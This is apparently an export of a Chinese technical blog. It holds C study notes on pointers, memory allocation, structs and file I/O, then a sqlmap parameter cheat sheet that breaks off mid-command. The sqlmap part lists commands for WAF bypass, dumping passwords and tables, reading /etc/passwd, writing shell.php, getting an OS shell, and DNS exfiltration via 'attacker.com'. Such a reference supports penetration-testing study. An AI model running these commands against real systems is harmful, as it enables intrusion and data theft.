p[0] +1\n    printf(\"a[0]=%d, j=%d, *p=%d \\n\", a[0], j, *p);  // 2,7,8  ？？？  \n\n\tgetchar();\n}\n\n//野指针: free以后的指针未被赋值为NULL  (指向了一个未知的空间)\nvoid test5()\n{\n\t\n    int *p, *p1, *p2, *p3;\n    p = (int *)malloc(4);\n    *p = 1;\n    free(p);\n\n    p = NULL;   // 赋值null以后，后面用的话会崩溃，能迅速找到问题\n\n    p1 = (int *)malloc(4);  \n    *p1 = 2;  // 没有free\n\n    p2 = (int *)malloc(4);\n    *p2 = 2;\n    free(p1);\n\n    p3 = (int *)malloc(4);\n    *p3 = 3;\n    *p1 = 20; // 以为p1free了，这里又赋值\n    printf(\"p3 = %d\", *p3);   //  20了    malloc有缓存机制\n}\n\n\n\n// 经典程序：互换两个数字\nvoid exchange_two()\n{\n\tint a=3;\n\tint b=5;\n\t//int t;\n\n\t//之前的做法\n\t//t=a;\n\t//a=b;\n\t//b=t;\n\n\t// 现在要求调用一个函数实现\n\ttest_exchange3(&a, &b);\n\n\tprintf(\"a=%d,b=%d\",a,b);\n\n\tgetchar();\n\n}\n\n// 不能完成互换功能\nvoid test_exchange1(int a, int b)\n{\n\tint t;\n\n\tt=a;\n\ta=b;\n\tb=t;\n}\n\n\n// 不能完成互换功能，只是把q和p的值换了，a和b并没有互换\nvoid test_exchange2(int *p, int *q)\n{\n\tint *t; // 如果要互换，变量类型必须一致\t\n\tt = p; \n\tp = q;\n\tq = t;\n\n\t// 形参的改变，不会改变实参的值\n}\n\n\n// 可以完成互换: p是a的地址，*p就是a\nvoid test_exchange3(int *p, int *q)\n{\n\tint t; // 如果要互换，变量类型必须一致\t\n\tt = *p;  // *p是int，p是int* \n\t*p = *q;\n\t*q = t;\n}\n\n\n// *的含义\nvoid test6()\n{\n\t//1.乘法\n\t//2.定义指针变量 \n\tint *p;  //定义了一个叫p的变，int *表示p只能存放地址\n\t//3.指针运算符：取地址的逆运算/间接访问\n\t// 放在已经定义好的指针变量的前面，取改指针的值\n\t//*p 表示以p的内容为地址的变量\n\n\t//写法：下面三种是等价的\n\t//int * p;\n\t//int *p;\n\t//int* p;\n}\n\nvoid free_test()\n{\n/*\n脏数据\n申请的空间不释放：内存泄露\n堆空间：一旦申请，一直占用，除非free\n\n*/\n    int i;\n    char *p;\n    scanf(\"%d\", &i);\n    p = (char *)malloc(i);\n    strcpy(p, \"hello\");   // p指向堆空间\n    // p = \"hellp\";\n    puts(p);\n    free(p);  // 释放\n    printf(\"free p ~~~~~~~~~~~\");\n}\n\n\nvoid test7()\n{\n\t// 一个指针变量到底占几个字节？\n\t/*\n\t指向不同类型，是不同的，比如int 一般是4个字节, char就是1个。     sizeof()可以查看：sizeof(double)\n\tp,q,r所占的字节数是一样的\n\t【总结：】一个指针变量，无论他指向的变量占几个字节，该指针变量只占四个字节。\n\t一个变量的地址使用该变量首字节的地址来表示\n\t*/\n}\n\n\n//动态内存分配（重点）\nvoid test8()\n{\n\t/*\n\t1.传统数组的缺点\n\t\ta.数组长度必须事先制定，且只能是长整数，不能是变量（int len=5; int a[len]; 这样是错误的）\n\t\tb.传统形式定义的数组，该数组的内存，程序员无法手动释放（一旦定义，该分配空间一直存在，直到数组所在的函数运行结束，数组的空间才会被系统释放）\n\t\tc.数组的长度不能再函数运行过程中动态扩充或缩小(长度一旦定义，其长度就不能再更改)\n\t\td.A函数定义的数组，在A函数运行期间可以被其他函数使用；但A函数执行完毕后，A函数中的数组将无法再被其他函数使用\n\t\t传统数组也叫静态数组\n\t\t\t\n\t2.为什么需要动态分配内存\n\t\t解决了传统数组的4个缺陷\n\n\t3.动态内存分配举例_  动态数组的构造\n\n\t4.静态内存和动态内存的比较\n\n\t5.跨函数使用内存的问题\n\t\n\t*/\n\n}\n\nvoid dynami_memo1()\n{\n\t// malloc 是memory(内存) allocate(分配)的缩写\n\n\tint i = 5;\n    char *p;\n    p = (char *)malloc(i);  \n\t/*\n\t\n\t\t1.要使用malloc，必须添加malloc.h或stdlib.h头文件\n\t\t2.malloc只有一个形参，且形参必须是整数类型\n\t\t3.上面，表示请求系统为本程序分配5个字节\n\t\t4.malloc函数只能返回第一个字节的地址，所以前面要把地址强制转换为int*\n\t\t5.p本身的内存是静态分配的，p所指向的内存是动态分配的\n\t*/\n\n    strcpy(p, \"hello\");   // p指向堆空间\n    // p = h e l l o \\o;\n    puts(p);\n    free(p);  // 释放p所指向的内存 （p本身的内存是静态的，不能由程序员手动释放）\n    printf(\"free p ~~~~~~~~~~~\");\n// 脏数据\n// 申请的空间不释放：内存泄露\n// 堆空间：一旦申请，一直占用，除非free\n}\n\nvoid f(int *q)\n{\n\t// *p = 200; // error\n\t// q = 20   //error\n\t// q是p的一份拷贝(副本)\n\t// **q=200  // error\n\t*q=200;\n}\n\nvoid dynami_memo2()\n{\n\t//int *arr = (int*)malloc(20);\n //   int *p;\n //   arr[0] = 1;\n //   arr[1] = 1;\n //   arr[2] = 1;\n //   arr[3] = 1;\n\n //   p = (int*)realloc(arr, 40);    // 扩展\n //   p[4] = 6;\n\n\tint *p = (int *)malloc(sizeof(int));\n\t*p = 10;\n\n\tprintf(\"%d\\n\", *p); //10\n\tf(p);\n\tprintf(\"%d\\n\", *p); //200\n}\n\n//动态内存分配举例 动态一维数组的构造\nvoid dynami_memo3()\n{\n\tint len;\n\tint *pArr;\n\tint i;\n\n\tprintf(\"请输出要存放元素的个数：\");\n\tscanf(\"%d\", &len); // 5\n\tpArr = (int *)malloc(4*len);  // 数组长度为len； 5*4=20,（默认pArr指向第一个字节，但是由于进行了int强转，所以pArr指向前四个字节,pArr指向后面4个字节）\n\t//类似于 int pArr[len];\n\n\t//赋值\n\tfor (i=0; i<len; ++i)\n\t{\n\t\tscanf(\"%d\", &pArr[i]);\n\t}\n\t\n\t//输出\n\tprintf(\"一维数组的内容是: \\n\");\n\tfor (i=0; i<len; ++i)\n\t{\n\t\tprintf(\"%d, \", pArr[i]);\n\t}\n\n\trealloc(pArr, 40);    // 扩展\n\n\t//释放数组\n\tfree(pArr);\n}\n\n//动态内存和静态内存的比较\nvoid dynami_memo4()\n{\n\t/*\n\t静态内存是由系统自动分配，由系统自动释放，是在栈分配的\n\t动态内存是由程序员手动分配，手动释放，是由堆分配的\n\n\tmalloc是堆分配的\n\t栈是存储结构，堆是排序方式\n\t*/\n}\n\nvoid multi_test(int **pp)\n{\n\tint j=300;\n\t//  pp是p的地址，那*pp 就是p\n\t*pp = &j;   // 修改\n\t**pp = 200; // 修改\n\n}\n//多级指针（意义：跨函数使用内存）\nvoid two_pointer()\n{\n\t// 【场景】：当在子函数中需要修改主函数某一个一级指针变量的值，就需要二级指针\n    //char b[N][10] = {\"lilei\",\"hanmeimei\",\"xiyangyang\",\"huitailang\", \"xiongda\"};\n    //char * p[N];  // 指针数组，里面存储的指针类型就是 二级指针   // &p[0]        每次偏移是固定的，64位数下就是8个字节\n    //// char **p2;\n    //int i;\n    //for(i=0; i<N; i++)\n    //{\n    //    p[i] = b[i];\n\n    //}\n\n    //for(i=0; i<N; i++)\n    //{\n    //    puts(p[i]);\n\n    //}\n\n\tint i = 10;\n\tint *p = &i;\n\tint **q = &p;\n\tint ***r = &q;\n\n\t//r = &p;   // 错误，因为r是int**类型，r只能存放int**类型变量的地址\n\tprintf(\"%d\",***r); // r的值\n\n\t//在另一个函数内部改变变量值\n\tmulti_test(&p);  // p是int *, 那么 &p是int**\n}\n\n\nvoid f1(int **q)\n{\n\tint i=5;\n\t//*q等价于p，q和**q都不等价于p\n\t// *q=i // error\n\t*q = &i;  // p=&i\n\t//**q=i;\n}\n\n//静态变量不能跨函数使用\nvoid dynami_memo5()\n{\n\tint *p;\n\n\tf1(&p);\n\tprintf(\"%d\", *p);  // 本语句语法没有问题，但逻辑上有问题（因为f函数中i的静态分配的，f结束，i的空间就释放了）\n}\n\nvoid f2(int **q)\n{\n\t*q = (int *)malloc(sizeof(int));\n\t// 等价于p = (int *)malloc(sizeof(int));\n\t//q=5;  // error\n\t//*q=5; // p=5   error\n\t**q=5; // *p=5\n}\n\n//动态内存可以跨函数使用（重点）\nvoid dynami_memo6()\n{\n\tint *p;\n\tf2(&p);\n\tprintf(\"%d\", *p); // 能改变。p指向的是上面堆里面分配的空间\n\n}\n\n```\n\n\n\n\n\n\n\n#### 结构体\n\njiegouti.h\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nvoid test();\nvoid struc_func();\nvoid InputStudent(struct Student *);\nvoid OutputStudent(struct Student);\nvoid OutputStudent2(struct Student *);\nvoid test_union();\n\n```\n\nmain.c\n\n```c\n#include \"jiegouti.h\"\n\nvoid main()\n{\n\n}\n\nvoid test()\n{       \n\t\t/*\n\t\t为什么需要结构体？\n\t\t\t为了表示一些复杂的事物，而普通的数据类型无法满足实际需求\n\n\n\t\t结构体：\n\t\t\t把一些基本类型组合到一起，形成的一个新的符合数据类型\n\n\n\t\t大小：\n\t\t\t结构体：总大小一般情况下等于各成员大小之和(先不考虑内存对齐)\n\t\t\t共用体：大小等于成员中最大的那个大小。（通常和结构体一起使用）\n\t\t\n\n\t\t如何定义(推荐第一种)：\n\t\t\t1. 推荐（这只是定义了一个新的数据类型，并没有定义变量）\n\t\t\t struct student{\n\t\t\t\tint num;\n\t\t\t\tchar name[20];\n\t\t\t\tint age;\n\t\t\t };\n\n\t\t\t2. 这样只能定义一次\n\t\t\t struct student{\n\t\t\t\tint num;\n\t\t\t\tchar name[20];\n\t\t\t\tint age;\n\t\t\t } st1;\n\n\t\t\t 3. 类型都没写...\n\t\t\t struct {\n\t\t\t\tint num;\n\t\t\t\tchar name[20];\n\t\t\t\tint age;\n\t\t\t } st1;\n\n\t\t\t //赋值和初始化(定义同时可以整体赋值,定义玩之后只能单个赋值)\n\t\t\t\t 定义同时初始化： struct student s1 = {1,'xxx',18};\n\t\t\t\t 先定义，后赋值：\n\t\t\t\t\t\t\t\t  struct student s2;\n\t\t\t\t\t\t\t\t  s2.num=1;\n\t\t\t\t\t\t\t\t  s2.name='yyy';\n\t\t\t\t\t\t\t\t  s2.age=19;\n\n\n\t\t\t //取出结构体变量中每一个成员【重点】\n\t\t\t\t1.结构体指针变量名.成员名\n\t\t\t\t2.指针变量名->成员名    （第二种更常用）\n\t\t\t\t\t\t\tstruct student *p = &s;  //注意是&\n\t\t\t\t\t\t\tp->name; //第一种方式(指针变量->成员变量名,在计算机内部会被转换为(*指针变量名).成员名)\n\t\t\t\t\t\t\t(*p).name; //第二种方式，与 s.name; 等价\n\n\n\t\t\t//结构体变量的运算\n\t\t\t\t结构体变量不能相加，相减，也不能相互乘除。\n\t\t\t\t但结构体变量可以相互赋值\n\n\t\t\t//结构体变量和结构体变量指针作为函数参数传递的问题\n\n\t\t\t//动态构造结构体数组\n\n\t\t\t//链表\n\t\t\n\t\t*/\n\n\t\tint num;\n\n\t    struct student{\n\t\t\tint num;\n\t\t\tchar name[20];\n\t\t\tchar gender;\n\t\t\tint age;\n\t\t\tfloat score;\n\t\t\tchar addr[30];\n\t\t} ss={1,'xx','nan',20,99.9,'hhh'};   // ss就是变量 可以直接在这里初始化\n\n\t\t//赋值和初始化\n\t\tstruct student ss2 = {2,'yy','bei',20,99.9,'zzz'};\n\t\tstruct student s = {100,'lala','M',20,99.5, 'beij'};\n\n\n\t\t// 结构体数组\n\t\tstruct student sArr[3];\n\n\t\tfor (int i = 0; i < 3; i++)\n\t\t{\n\t\t\tscanf(\"%d%s %c%d%f%s\", &sArr[i].num, sArr[i].name, &sArr[i].gender, &sArr[i].age,&sArr[i].score, &sArr[i].addr); // %c 忽略空格\n\t\t}\n\n\n\t\t// 结构体指针\n\n\t\tstruct student *p = &s;  //注意是&\n\t\t//p = &s;\n\t\t// 获取成员\n\n\t\tp->name; //第一种方式(指针变量->成员变量名,在计算机内部会被转换为(*指针变量名).成员名)\n\t\t(*p).name; //第二种方式，与 s.name; 等价\n\n\t\t// p->name的含义：p所指向的那个结构体变量中的name这个成员\n\n\n\t\tnum = p->num++;   // num = p->num, num=p->num+1;   //优先级\n\t\t// 第一时间去掉++\n\t\tnum = p++->num;    // 没问题, num=p->num,  p=p+1\n\n\n\t\t//浮点型默认在C语言中是double，如果要定义成float，则在后面加f或F， 但是不能准确存储\n\n}\n\n///////////////////////////////////////////\n\nstruct Student{\n\tint num;\n\tchar name[20];\n\tint age;\n};\n\n// 通过函数完成对结构体变量的输入和输出\nvoid struc_func()\n{\n\n\tstruct Student st;\n\n\tInputStudent(&st);  //对结构体变量输入\n\tOutputStudent(st);  //对结构体变量输出\n\tOutputStudent2(&st);  //对结构体变量输出\n\n\n}\n\n\nvoid InputStudent(struct Student * pstu) //pstu只占4个字节\n{\n\t(*pstu).num=1;\n\tstrcpy(pstu->name, \"xxx\");  \n\tpstu->age=18;\n\n};\n\n/*  这是无法改变主函数的值的\nvoid InputStudent(struct Student stu)\n{\n\tstu.num=1;\n\tstrcpy(stu.name, \"xxx\");  \n\tstu.age=18;\n\n};*/\n\n\n////应该发送内容还是传送地址？\n//如果传递的是内容，内存消耗大\nvoid OutputStudent(struct Student stu)\n{\n\tprintf(\"%d, %s %d\", stu.num,stu.name, stu.age);\n}\n\n// 如果传递的是地址，可能不安全，但是提高了速度，节省了内存（推荐这种方法）\nvoid OutputStudent2(struct Student *pstu)\n{\n\tprintf(\"%d, %s %d\", pstu->num,pstu->name, pstu->age);\n}\n\n\n\n/*\n【指针优点大总结：】\n\n快速的传递数据，较少了内存的消耗 【重点】\n使函数返回一个以上的值  【重点】\n能直接访问硬件\n能方便的处理字符串\n\n\n**/\n\n\n//共用体\nvoid test_union()\n{\n\t//共用体：大小等于成员中最大的那个大小（通常和结构体一起使用）\n\n\t// union 共用体name\n\t// {\n\t//     成员表列\n\t// } 变量表列;\n\n\tunion data{\n\t\tint i;\n\t\tchar c;\n\t\tfloat f;\n\t}u1;\n\n\t// 共用体的起始地址和每个成员的起始地址是相同的\n\t// 一个时间内只能存取一个成员\n    \n\tunion data d; // 现在最大的就是4\n\td.i = 4;\n\td.c='A';\n\td.f = 99.9;\n\n}\n\n\n```\n\n\n\n\n\n#### typedef\n\n```c\n//1) 为基本数据类型定义新的类型名\ntypedef double REAL;\n\n    \n//2) 为自定义数据类型（结构体、共用体和枚举类型）定义简洁的类型名称\ntypedef struct tagPoint\n{\n    double x;\n    double y;\n    double z;\n} Point;\n/*\n实际上完成了两个操作：\n1、定义了一个新的结构类型\nstruct tagPoint\n{\n    double x;\n    double y;\n    double z;\n} ;\n2、使用 typedef 为这个新的结构起了一个别名，叫 Point\ntypedef struct tagPoint Point\n*/\n\n\n//3) 为数组定义简洁的类型名称\ntypedef char* PCHAR;\nPCHAR pa\n    \n\n```\n\n\n\n\n\n#### NULL\n\n```\n二进制全部为0的含义：  \n    1.数值为0\n    2.字符串结束标记符 '\\0'\n    3.空指针NULL\n        NULL表示编号为0的地址\n        NULL表示的是零，不是数字，而是代表内存单元的编号\n\n        计算机规定了，以零为编号的存储单元的内存不可读、不可写\n```\n\n\n\n\n\n#### 文件\n\n```c\n//文件\nvoid test_file()\n{\n\t# define N 20\n\n\tFILE *fp;\n    char c;\n    char p;\n    char ret;\n    char buf[N] = {0};   // 先初始化\n    // fp = fopen(\"file.txt\", \"r\");\n    fp = fopen(\"D:\\Desktop\\1.txt\", \"r+\");    // argv[1] 是传递的第一个参数\n    if(fp == NULL)   // 判断打开是否成功， -> 失败\n    {\n        perror(\"fopen\");   // 定位函数执行错误原因（只能定位刚刚执行的）\n        goto error;\n\n    }\n    // fgetc   读取，一次读取一个字节\n   while ((c = fgetc(fp)) != EOF)\n   {\n       printf(\"%c\",c);\n   }\n   \n\n    // fputs   写入，一次写入一个字节\n    p = 'H';\n    ret = fputc(p, fp);\n\n\n\t// printf(FILE *fp,const char *format, ...) 函数来写把一个字符串写入到文件中\n\tfprintf(fp, \"This is testing for fprintf...\\n\");\n\n    \n\n    // fread:      buf没有\\0\n    ret = fread(buf, sizeof(char), N, fp);\n    printf(\"%d, %s \\n\", ret, buf);\n\n    // fwrite:\n    strcpy(buf, \"word\");\n    ret = fwrite(buf, sizeof(char), strlen(buf), fp);\n\n    // 清空buffer\n    memset(buf,0,sizeof(buf));\n\n\n\n\n    // fseek\n    fseek(fp, 0, SEEK_SET);   //  移动到开头。\tSEEK_SET,偏移量的起始点:文件开始处\n\n    fseek(fp, -12, SEEK_CUR);   // 往回偏移, 与磁盘上实际的字节数对应。\tSEEK_CUT:文件当前位置 \n\t\t\t\t\t\t\t    // SEEK_END,偏移量的起始点：SEEK_END\n\n\n    // ftell      获取文件读写指针的当前位置\n\tlong last = ftell(fp);\n\n\n    fclose(fp);  \n\n    error:\n        printf(\"error!!!\");\n        // fclose(fp);  // 关闭文件\n}\n\n```\n\n","tags":["琐碎复习"],"categories":["C语言"]},{"title":"sqlmap参数简介","url":"%2Fposts%2F53327%2F","content":"\n\n\n<img src=\"http://image.xpshuai.cn/sqlmap.png\"></img>\n\n<!-- more -->\n\n\n\n\n\n# 概述\n\n- [官网](<https://github.com/sqlmapproject/sqlmap/wiki/Usage>)\n\n- 其他特性：\n  1. 数据库直接连接 `-d`, 不通过SQL注入，执行身份认证信息，ip，端口\n  2. 与BurpSuite，Google结合使用，支持政策表但是限定测试目标\n  3. 支持Basic, Digest, BTLM, CA 身份认证\n  4. db版本， 用户，权限，hash枚举和字典破解，暴力破解表列名称\n  5. 文件上传下载，UDF， 启动并执行存储过程，操作系统命令执行，访问win注册表\n  6. 与w3af， metasploit集成结合使用，基于数据库服务进程提权和上传执行后门\n\n\n\n**升级:**\n```\n# 在线更新sqlmap\nsqlmap --update\n\n# 离线升级\ngit pull\n```\n\n**其他常识：**\n```\n# 结果文件夹位置\n/.root/sqlmap/output\n\n# 日志\n.sqlmap\n   \n# 配置文件  \n自己找\n\n```\n\n\n\n# 基本参数\n\n#### <font color=red>1. Target</font>\n\n   **Get方法：**\n\n```shell\n   -u url链接   # get链接\n   -f # 检查DBMS的指纹信息\n   -p user_name # 指定字段参数\n   -m list.txt  # 扫描url列表文件\n   -g  # google搜索,自动去google找到然后自动注入    \\” 是转义引号，如下所示：\n   # 例如： sqlmap -g \"inurl:\\\".php?id=1\\\"  \n   \n   # 结果文件夹位置\n   /.root/sqlmap/output\n   \n   -- users   # 有哪些user\t\n   --banner  # banner 信息\n   --dbs   # 有哪些库\n   --schema   #元数据(查的是informatin_schema信息，前提是有权限)\n   -a     # 所有的\n   -d  “mysql://root:@192.168.20.10:3306/dvwa”    # 让sqlmap作为客户端链接数据库（dvwa是数据库名称）\n   \n```\n\n   **Post方法：**\n就不是通过url来扫描了，而是body来进行扫描\n\n```shell\n -r request.txt    # 使用http请求文件进行注入（burpsuite拦截的请求数据包复制保存到文件, 存在注入的位置用*标出）\n -l  log.txt       #  使用burpsuite log文件 （使用burpsuite:option-> Misc ->logging -> 这里选择Proxy-> 这里选择requests-> 选择log文件保存位置 ）\n --force-ssl       #  支持Https，即听过https来进行请求，或在url域名后+443端口也可以\n -c  sqlmap.conf   #  扫描配置文件（把扫描配置写到里面，把它引用即可）\n \n \n # 查找文件\n dpokg -L    # 找有关..的文件包\n dpokg -L sqlmap | grep sqlmap.conf\n```\n\n#### <font color=red>2. Request </font>  \npost请求  \n\n```bash\n--data=\"user=xx&pswd=yy\"   # 数据（对于post请求：除了保存请求头的方法，也可以这样data加参数， 也支持get方法：参数放--data后面）\n--param-del=\";\"   # 变量分隔符(若多个变量不是以&分割),如：参数以分号分割   --data=\"name=1;id=11\" --param-del=\";\"\n--cookie \"xxxxxxxxx\" --level=2 # 带上cookie头(level=2时才会检查cookie是否存在注入点)\t\t参数: set-cookie / --drop-set-cookie 是否丢弃上一个cookie,使用新的cookie\n#cookie ---> 登陆后才能访问的页面\n--user-agent=\"xxxxxxxxxx\"   #  指定ua头\n--random-agent --level=3  # 随机ua头字典: /usr/share/sqlmap/txt/user-agents.txt,  win下：sqlmap/data/txt/user-agents.txt\n#--level>=3   # 才会检查user-agent头是否存在sql注入\n\n#app/waf/IPS/IDS过滤异常的ua头，sqlmap会报错\n\n--host \"aaaaaaa\" --level=5  # host头\n--level=5  # 才会检查host头是否存在sql注入(一般不建议设置这么高)\n\n--referrer --level=3     # 检查referrer\n--level >=3   # 才会检查referrer是否存在sql注入\n\n--headers=\"host:www.a.com\\nUser-Agent:xps\"   # 额外的自定义的headers（\\n是换行，注意大小写）\n--headers=\"X-Forwarded-For:* \" --dbs --batch \n--method=GET/POST  # 限定请求方法\n\n```\n\n- **基于http身份认证**  \n\n三种身份认证类型：\n- Basic\n- Diagest\n- NTLM\n  ```bash\n  --auth-type Basic  --auth-cred \"user:pass\"  # --auth-type指定身份认证类型，后门是账号密码\n  ```\n基于客户端证书的身份认证 : \n   ```bash\n\t# 用的很少\n\t# 下面两种参数不知道是哪个了，使用的时候自己查一下\n\t--auth-cert \n\t--auth-file=\"ca.PEM\"    #含有私钥的PEM的证书文件\n   ```\n\n- **http(s)代理**\n使用代理防止被封等\n  ```bash\n  --proxy=\"http://127.0.0.1:8888\"          # 本地网络的话不需要代理设置\n  --auth-cred \"user:pass\"     # 如果需要身份认证\n  --ignore-proxy   # 忽略系统代理设置，通常用户扫描本地网络目标（用于对本地/内容目标进行扫描的时候）\n  ```\n\n  \n\n- **超时**\n  \n  ```bash\n  --deplay=\"6\"      # 每次请求之间延迟时间， 单位:s\n  --timeout=\"10\"    # 请求超时时间，浮点数，默认30s\n  --retries=\"5\"      # 连接超时重试次数，默认3次\n  --randomsize=\"id\"    # 长度、类型与原始值保持一致的前提下，指定每次请求随机取值 的参数name（对id随机取值,但长度与原始是一致的）\n  ```\n  \n  ```bash\n  --scope         # 过滤日志(burp的request日志-->option,Logging,proxy,requests)内容， 通过正则筛选扫描对象；\n  -l burp.log  --scope=\"{www}?\\.target\\.{com|net|org}\" --level=3\n  \n  --safe-url / --safe-freq     # 检测和盲注阶段会产生大量失败请求，服务端可能因此销毁session。\n  #因此：每发送 --safe-freq次注入请求之后，发送一次正常的请求\n  \n  --skip-urlencode    # 跳过url编码(默认GET方法会对内容进行编码，某些编码人员不遵守编码规则没编码)\n   \n  --eval=\"import hashlib;hash=hashlib.md5(id).hexdigest()\"   # 每次请求之前执行的py代码  / 每次请求更改或者增加新的参数值（时间依赖。其他参数依赖）后面值是依赖前面值的\n  -u \"id=1?hash=c4ca423dj8caf5d\" --eval =\"import hashlib;hash=hashlib.md5(id).hexdigest()\"        # 比如后面参数是hash的，每次都把id编码\n  ```\n ```\n\n\n#### <font color=red>3. Detection </font>\n风险等级\n​```bash\n   --level    # 1-5级（默认1）   payload文件xml：/usr/share/sqpmap/xml/payloads， win：sqlmap\\data\\xml\\payloads\n   --risk     # 1-4级(默认1/无害), risk升高可能造成数据被篡改风险(update),2会增加事件的测试语句，3会增加OR语句的sql注入测试\n   --string / --not-string  / --regexp   / --code  / --text-only  / --titles    # 页面比较，基于bool的注入监测，依据返回页面内容的百年华判断真假逻辑。但有些页面随着时间阈值变化，此时需要人为执行标识真假的字符串\n   \n ```\n\n#### <font color=red>4. Optimization </font>\n优化性能相关的参数\n```bash\n     --predict-output   # 预设输出。根据检测方法，比对返回值和统计表内容，不断缩小监测范围；版本名，用户名，密码，Provileges，role，db名，表名，列名；\n     #与--threads不兼容；统计表\t\t\n     #进而精确定位是什么数据库和版本等，        /usr/share/sqlmap/txt/common-outputs.txt\n     \n     --keep-alive  # 使用长连接，性能好，与--proxy不兼容， 但是大量长连接会严重占用服务器资源\n     \n     --null-connection   # 只获取相应页面大小值，而非内容； 【用于盲注判断 真假】，降低网络带宽消耗；与--text-only参数不兼容(基于页面内容比较判断 真假)\n     \n     --threads=10  # 最大并发线程，盲注时每个线程获取一个字符（7次请求），获取完成后线程结束；默认1，建议不要大于10（可能会影响站点性能）\n     \n     -o   # 开启前三个性能参数（除了--threads）\n     \n```\n\n**指纹信息**\n```bash\n     # Figerprint\n     -f  / --figerprint  / -b  /  --banner   # dbms指纹信息； DBMS，操作系统，架构，补丁\n```\n\n​     \n\n#### <font color=red>5. Enumeration </font>\n枚举\n```bash\n     --schema --batch --exclude-sysdbs  # sschema:元数据(使用默认选项)   -- batch:自动执行\n     --count\n     -a     # --all\n     -b     # --banner\n     --current-user\n     --current-db\n     --hostname\t\t # 机器的主名\n     --is-dba\n     --users         # 列出所有用户\n     --passwords\n     --privileges -U user_name  # 查看用户的权限（不加-U就是查当前用户）\n     --roles\n     --dbs          # 列出所有数据库\n     --tables\n     --columns\n     --schema       # 列出information_schema信息    --schema --exclude-sysdbs \n     \n     # Dump数据：\n     --dump  # 获取表中的数据，包括列\n     --stop\n     --dump-all exclude-sysdbs   # 除了系统库,...\n     -C   # column\n     -T  glag_table\n     -D  dvwa\n     -X\n     -U   # user\n     --start 100 --stop 200   # 指定分段\n     --stop\n     --sql-query \"select * from users\"   # 后面加要执行的sql语句\n     \n     --exclude-sysdbs  # 除去系统库\n     --pivot-column=P...   #\n\n# 指定库表的列\n-D dvwa -T users --columns\n# dump数据\n-D dvwa -T users --dump\n```\n\n#### 暴力破解\n是基于字典的\n```bash\n# mysql <5.0没有information_schema库\t， mysql>=5.0如果无权读取...\n# access 无权读物MSysyObjects库\n--common-tables\n--common-columns   # (Access系统表无列信息)\n```\n\n#### 文件系统\n```bash\n     FILE SYSTEM:\n     --file-read=\"/etc/passwd\"   # 读系统文件\n     --file-write=\"shell.php\"  --file-dest\"/temp/shell.php\"   # 写,前面是源文件，后门是要写入到的文件\n```\n\n#### UDF注入\n详细的去查资料吧\n```bash\n     UDF injection:   (User Design Function)\n     --udf-inject, --shared-lib   # 编译共享库创建并上传到DB Server，以此生成UDF实现高级注入。\n     #Linux：share object, windows:DLL\n     \n     \n```\n\n#### 操作系统\n```bash\n     OS:\n     # mysql, postgresql:  上传共享库并生成 sys-exec(), sys_eval()两个UDF\n     # MSsql： xp_cmdshell 存储过程(1.有就用，2.禁就启，3.没就建)\n     --sql-shell\n     --os-shell\n     --os-cmd\n     \n```\n\n​     \n\n#### <font color=red>6. Miscelianeous:    </font>\n![](http://image.xpshuai.cn/sqlmap_z.png)\n```bash\n-z  # 参数助记符, \n--answer=\"extending=N\"   # 让出现提示的选项都选Y或N\n--check-waf   # 检测WAF/IPS/IDS\n--hpp   # 绕过检测WAF/IPS/IDS的有效方法；尤其对ASP/IIS 和ASP.NET/IIS检查\n--identify   # 彻底检查WAF/IPS/I\n-mobile  # 模拟智能手机设备\n--purge-output   # 清除output文件夹\n--smart   # 当有大量检测目标的时候，只选择基于错误的检测结果\n--wizard  # 向导方式\n```\n\n#### <font color=red>7. General</font>\n\n```bash\n-s    # sqlite会话文件保存位置\n-t    # 记录流量文件保存位置\n--charset=GBK   # 强制字符编码\n--crawl=3  # 从起始位置爬站深度\n--csv-del=\";\"   # dump数据默认存在于\",\"分割的csv文件中，可以指定其他分隔符\n--dbms-cred   # 指定数据库账号\n--flush-session  # 清空session\n--force-ssl    # 让sqlmap知道访问的是https的网站\n--fresh-queries   # 忽略seeeion查询结果\n--hex -v 3     # dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原 \n--output-dir=\"/tmp\"\n--parse-errors    # 分析和显示数据库内建保存信息\n--save   # 将命令保存成配置文件\n \n```\n\n#### <font color=red>8. Windows Registory</font>\n win注册表 \n```bash\n# 前提是有权限\n--reg-read  # 读取\n--reg-add   # 添加\n--reg-del\n--reg-key, --reg-value, --reg-data, --reg-type=''    #..键的值等于...\n```\n\n​     \n\n#### <font color=red>9. injection</font>\n注入\n```bash\n-p \"id,referrer\"  指定扫描参数（即存在注入的那个参数），使 --level失效\n\n--skip=\"name, user-agent\"   # 排除指定的扫描参数\n\n--dbms  # 判断数据库类型\n--dbms=\"mysql\"   # 指定只用mysql的方法进行注入\n--os=''    # 指定系统\n--invalid-bignum    /   --invalid-logical   # bignum使用大数使参数值失效id=99999999；  logical 使用布尔判断使取值失效 id=13 AND 18=19\n\n--no-cast  #  榨取数据时，sqlmap将所有结果转换为str，并将空格替换NULL结果\n--no-escape # 关闭功能：（当payload中用单引号界定str时，sqlmap使用char()编码逃逸的方法替换str）\n--prefix   # 前缀\n--suffix   # 后缀    “...?id=1” -p id --prefix\"')\" --suffix \"AND ('abc'='abc\"\n--tamper=\"xxxxx, yyyyyy, zzzzzz\"   # 混淆脚本(可自定义脚本)，染过应用层过滤，ips，waf    位置:/usr/share/sqlmaptamper\n\n#伪静态注入(全是斜线，使用“*”符号来自定义注射位置) \nsqlmap -u \"http://www.xxx.com/123/456*/789\" -v 4 \n\n```\n\n​     \n\n#### <font color=red>10. Techniques</font>\n技术 \n```bash\n#默认使用全部技术\nB:  Boolean-based bind\nE:  Error-based\nU:  Union auery-based\nS:  Stacked queries (文件系统，操作系统，注册表必须)\nT:  Time-based-bind\n\n--time-sec  # 基于时间的注入检测相应延迟时间（默认5s）\n--union-cols 6-9  # 默认联合查询1-10列，随--level增大最多支持50列 \n\n--union-char 123  # 联合查询默认使用NULL， 极端情况下NULL可能失败，此时可以手动执行数值 \n\n--dns-domain attacker.com # 攻击者控制了DNS服务器，使用此功能可以提高数据榨取速度\n\n--second-order http://1.1.1.1/a.php  # 在一个页面注入的结果，在另一个页面体现出来\n```\n\n\n\n​\t  \n\n\n\n# 小例子\n\n获取指定数据库 指定表 指定列\n\n```\n --batch -D 'dbname' -T 'tablename' -C 'username.password' --dump\n```\n\n\n\n提权操作\n\n```\n# 数据库提权\n--batch --sql-hell\n\n# 系统提权\n--batch --os-shell\n\n# 执行系统命令(前提要有权限)\n--os-cmd=ls /\n```\n\n把文件上传到数据库服务器中\n\n```\nsqlmap.py --file-write --file-dest 